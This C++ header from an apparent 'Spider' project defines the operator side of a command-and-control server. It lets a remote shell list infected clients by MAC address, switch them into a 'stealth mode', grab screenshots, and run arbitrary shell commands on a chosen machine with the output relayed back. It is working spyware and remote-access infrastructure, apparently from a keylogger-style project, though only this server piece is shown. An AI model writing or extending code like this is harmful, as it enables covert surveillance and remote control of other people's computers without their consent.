//
// Created by doom on 29/09/17.
//

#ifndef SPIDER_SERVER_SHELLSESSION_HPP
#define SPIDER_SERVER_SHELLSESSION_HPP

#include <string>
#include <Server/CommandableSession.hpp>
#include <Server/SpiderClientSession.hpp>

namespace spi
{
    class ShellClientSession : public CommandableSession
    {
    public:
        using Pointer = boost::shared_ptr<ShellClientSession>;

        template <typename ...Args>
        static auto createShared(Args &&...args)
        {
            return CommandableSession::create<ShellClientSession>(std::forward<Args>(args)...);
        }

        ShellClientSession(net::IOManager &io, net::SSLContext &ctx,
                           const std::vector<SpiderClientSession::Pointer> &clts) :
            CommandableSession(io, ctx, "shell-session"), _clients(clts)
        {
            _cmdHandler.onMessages(boost::bind(&ShellClientSession::__sendList, this, _1), proto::MessageType::RList);
            _cmdHandler.onMessages(boost::bind(&ShellClientSession::__handleStealthMode, this, _1),
                                   proto::MessageType::RStealthMode);
            _cmdHandler.onMessages(boost::bind(&ShellClientSession::__handleActiveMode, this, _1),
                                   proto::MessageType::RActiveMode);
            _cmdHandler.onMessages(boost::bind(&ShellClientSession::__handleScreenshot, this, _1),
                                   proto::MessageType::RScreenshot);
            _cmdHandler.onMessages(boost::bind(&ShellClientSession::__handleRunShell, this, _1),
                                   proto::MessageType::RRunShell);
        }

        virtual ~ShellClientSession() noexcept = default;

        void startSession() noexcept
        {
            asyncHandshake(net::SSLConnection::HandshakeType::Server,
                           boost::bind(&ShellClientSession::handleHandshake,
                                       shared_from_this_cast<ShellClientSession>(),
                                       net::ErrorPlaceholder));
        }

    private:
        SpiderClientSession *__findClient(const ::net::MACAddress &id)
        {
            auto it = std::find_if(_clients.begin(), _clients.end(), [&id](const SpiderClientSession::Pointer &cur) {
                return cur->getID() == id;
            });
            return it != _clients.end() ? it->get() : nullptr;
        }

        template <typename RequestT, typename MessageT>
        void __transmitRequest(const ILoggable &loggable)
        {
            const RequestT &m = static_cast<const RequestT &>(loggable);
            ErrorCode ec;
            proto::ReplyCode repCode;

            _log(logging::Debug) << m.stringify() << std::endl;

            auto client = __findClient(m.addr);
            if (client) {
                MessageT toSend;

                _log(logging::Debug) << "Transmitting request to client "
                                            << client->getID().toString() << std::endl;
                client->sendCommand(toSend, ec);
                repCode.code = !ec ? proto::ReplyType::OK : proto::ReplyType::KO;
            } else {
                _log(logging::Warning) << "Ignoring request: unknown client " << m.addr.toString() << std::endl;
                repCode.code = proto::ReplyType::KO;
            }

            sendCommand(repCode, ec);
            if (ec)
                _errorCb(this);
        }

        void __handleStealthMode(const ILoggable &loggable)
        {
            __transmitRequest<proto::RStealthMode, proto::StealthMode>(loggable);
        }

        void __handleActiveMode(const ILoggable &loggable)
        {
            __transmitRequest<proto::RActiveMode, proto::ActiveMode>(loggable);
        }

        void __handleScreenshot(const ILoggable &loggable)
        {
            __transmitRequest<proto::RScreenshot, proto::Screenshot>(loggable);
        }

        void __sendList([[maybe_unused]] const ILoggable &loggable)
        {
            proto::RListReply repl;

            for (const auto &cur : _clients) {
                if (cur->hasCommandConn()) {
                    repl.clients.push_back(cur->getID());
                }
            }
            ErrorCode ec;

            sendCommand(repl, ec);
            if (ec)
                _errorCb(this);
        }

        void __replyError() noexcept
        {
            proto::ReplyCode rc;

            rc.code = proto::ReplyType::KO;
            ErrorCode ec;
            sendCommand(rc, ec);
            if (ec)
                _errorCb(this);
        }

        void __handleRunShell(const ILoggable &l)
        {
            const proto::RRunShell &rrsh = static_cast<const proto::RRunShell &>(l);
            auto ptr = __findClient(rrsh.target);

            if (ptr) {
                proto::RunShell rsh;
                rsh.cmd = rrsh.cmd;

                ErrorCode ec;
                ptr->sendCommand(rsh, ec);
                if (!ec) {
                    auto &cmdConn = ptr->getCommandConn();

                    _clientCmdBuff.resize(Serializable::MetaDataSize);
                    cmdConn.asyncReadSize(net::BufferView(_clientCmdBuff.data(), _clientCmdBuff.size()),
                                          boost::protect(boost::bind(&ShellClientSession::__handleRedirCmdSize,
                                                                     shared_from_this_cast<ShellClientSession>(),
                                                                     ptr, net::ErrorPlaceholder)));
                } else
                    __replyError();
            } else
                __replyError();
        }

        /** Redirections: transmitting client responses back to the remote shell */

        void __handleRedirCmdSize(SpiderClientSession *ptr, const ErrorCode &ec)
        {
            if (!ec) {
                auto size = Serializer::unserializeInt(_clientCmdBuff, 0);
                std::cout << size << std::endl;
                _clientCmdBuff.resize(size);
                auto &cmdConn = ptr->getCommandConn();
                cmdConn.asyncReadSize(net::BufferView(_clientCmdBuff.data(), _clientCmdBuff.size()),
                                      boost::protect(boost::bind(&ShellClientSession::__handleRedirCmdData, this,
                                                                 net::ErrorPlaceholder)));
            } else {
                _log(logging::Warning) << "Unable to read command header from client : "
                                              << ec.message() << std::endl;
                __replyError();
            }
        }

        void __handleRedirCmdData(const ErrorCode &ec)
        {
            if (ec) {
                _log(logging::Warning) << "Unable to read command data from client" << ec.message() << std::endl;
                __replyError();
                return;
            }
            auto type = _cmdHandler.identifyMessage(_clientCmdBuff);
            if (type != proto::MessageType::Unknown) {
                Buffer sendBuf;

                Serializer::serializeInt(sendBuf, static_cast<uint32_t>(_clientCmdBuff.size()));
                sendBuf.insert(sendBuf.end(), _clientCmdBuff.begin(), _clientCmdBuff.end());

                ErrorCode sec;
                _conn.writeSome(sendBuf, sec);
                if (sec) {
                    _log(logging::Warning) << "Unable to transmit data to the remote shell" << std::endl;
                    _errorCb(this);
                }
            } else {
                _log(logging::Warning) << "Ignoring unrecognized command" << std::endl;
                __replyError();
            }
        }

    public:
        void sendCommand(const ILoggable &l, ErrorCode &ec) noexcept
        {
            Buffer buff;

            l.serialize(buff);
            _conn.writeSome(buff, ec);
        }

    private:
        const std::vector<SpiderClientSession::Pointer> &_clients;
        Buffer _clientCmdBuff;
    };
}

#endif //SPIDER_SERVER_SHELLSESSION_HPP
